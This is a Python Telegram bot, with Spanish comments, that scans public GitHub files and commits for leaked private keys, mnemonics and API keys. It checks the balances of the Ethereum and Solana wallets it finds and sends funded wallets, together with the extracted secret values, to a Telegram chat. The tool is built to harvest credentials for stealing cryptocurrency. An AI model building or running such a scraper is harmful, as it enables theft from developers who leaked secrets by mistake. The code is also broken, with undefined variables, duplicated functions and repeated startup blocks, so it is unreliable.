import os
import re
import requests
import asyncio
from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes

# ===== VARIABLES =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
ETHERSCAN_API_KEY = os.getenv("ETHERSCAN_API_KEY")

# ===== CONFIGU =====
MIN_ETH = 0
MIN_SOL = 0

SEARCH_TERMS = [
    "privateKey",
    "mnemonic",
    "seed phrase",
    "api_key",
    "SECRET_KEY",
    "PRIVATE_KEY ="
]

SEEN_URLS = set()

def github_monitor(context):
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}"
    }

    url = "https://api.github.com/events"

    try:
        r = requests.get(url, headers=headers, timeout=10).json()

        for event in r:

            if event["type"] != "PushEvent":
                continue

            repo = event["repo"]["name"]

            for commit in event["payload"]["commits"]:
                commit_id = commit["sha"]

                if commit_id in seen_commits:
                    continue

                seen_commits.add(commit_id)

                message = commit["message"]

                if any(k in message.lower() for k in KEYWORDS):

                    msg = f"""
🚨 POSIBLE LEAK EN TIEMPO REAL 🚨

📦 Repo: {repo}
📝 Commit: {message}
🔗 https://github.com/{repo}
"""

                    context.bot.send_message(chat_id=CHAT_ID, text=msg)

    except Exception as e:
        print("ERROR GITHUB:", e)

# ===== REGEX =====
ETH_REGEX = r"\b0x[a-fA-F0-9]{40}\b"
SOLANA_REGEX = r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b"
PRIVATE_KEY_REGEX = r"\b([A-Fa-f0-9]{64}|[1-9A-HJ-NP-Za-km-z]{64,})\b"

# ===== ETH BALANCE =====
def get_eth_balance(address):
    try:
        url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={ETHERSCAN_API_KEY}"
        r = requests.get(url).json()

        if r["status"] != "1":
            return 0

        wei = int(r["result"])
        return wei / 1e18
    except:
        return 0

# ===== SOL BALANCE =====
def get_sol_balance(address):
    try:
        url = "https://api.mainnet-beta.solana.com"
        payload = {
            "jsonrpc":"2.0",
            "id":1,
            "method":"getBalance",
            "params":[address]
        }
        r = requests.post(url, json=payload).json()
        lamports = r["result"]["value"]
        return lamports / 1e9
    except:
        return 0

# ===== DETECCIÓN =====
def detect_and_validate(text):
    findings = []

    # ETH
    eth_matches = re.findall(ETH_REGEX, text)
    for addr in eth_matches:
        bal = get_eth_balance(addr)
        if bal > 0:
            findings.append(f"🟣 ETH: {addr} | 💰 {bal:.4f}")
        else:
            findings.append(f"🟣 ETH: {addr} | ⚠️ 0")

    # SOL
    sol_matches = re.findall(SOLANA_REGEX, text)
    for addr in sol_matches:
        bal = get_sol_balance(addr)
        if bal > 0:
            findings.append(f"🟢 SOL: {addr} | 💰 {bal:.4f}")
        else:
            findings.append(f"🟢 SOL: {addr} | ⚠️ 0")

    # PRIVATE KEY
    if re.search(PRIVATE_KEY_REGEX, text):
        findings.append("🔑 POSIBLE PRIVATE KEY")

    return findings

# ===== EXTRAER =====
def extract_values(text):
    return list(set(re.findall(VALUE_REGEX, text)))[:5]

def extract_wallets(text):
    return list(set(re.findall(ETH_REGEX, text)))[:3]

# ===== GITHUB =====
def search_github():
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}"
    }

    results = []

    for term in SEARCH_TERMS:
        url = f"https://api.github.com/events?q={term}+crypto+in:file+extension:py+extension:js&sort=indexed&order=desc"

        try:
            r = requests.get(url, headers=headers).json()

            for item in r.get("items", [])[:5]:
                file_url = item["html_url"]

                if file_url in SEEN_URLS:
                    continue

                SEEN_URLS.add(file_url)

                raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")

                try:
                    content = requests.get(raw_url, timeout=5).text[:4000]
                except:
                    continue

                if term.lower() not in content.lower():
                    continue

                values = extract_values(content)
                wallets = extract_wallets(content)

                # 🔥 verificar balances
                rich_wallets = []

                for w in wallets:
                    bal = get_eth_balance(w)
                    if bal > 0:
                        rich_wallets.append((w, bal))

                # 🚨 SOLO SI HAY DINERO
                if not rich_wallets:
                    continue

                msg = f"💸 LEAK CON DINERO DETECTADO 💸\n\n{file_url}\n\n"

                for w, b in rich_wallets:
                    msg += f"🟣 ETH: {w}\n💰 {b:.4f} ETH\n\n"

                for v in values:
                    msg += f"🔑 {v}\n"

                results.append(msg)

        except:
            continue

    return results

# ===== MONITOR =====
async def github_monitor(context: ContextTypes.DEFAULT_TYPE):
    results = search_github()

    for r in results:
        await context.bot.send_message(chat_id=CHAT_ID, text=r)

# ===== MAIN =====

app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

# 🔥 AQUI AGREGAS EL JOB
app.job_queue.run_repeating(github_monitor, interval=30, first=5)

print("🤖 BOT ELITE ACTIVO (LEAK + TIEMPO REAL)")

app.run_polling()

# limpiar webhook (forma correcta sin asyncio.run)
async def setup():
    await app.bot.delete_webhook(drop_pending_updates=True)

import asyncio
asyncio.get_event_loop().run_until_complete(setup())

# job automático
app.job_queue.run_repeating(github_monitor, interval=60, first=10)

print("🤖 BOT ELITE ACTIVO (LEAK + DINERO)")

# correr bot
app.run_polling()

# loop cada 60s
app.job_queue.run_repeating(github_monitor, interval=60, first=10)

print("🤖 BOT ELITE ACTIVO (LEAK + DINERO)")
app.run_polling()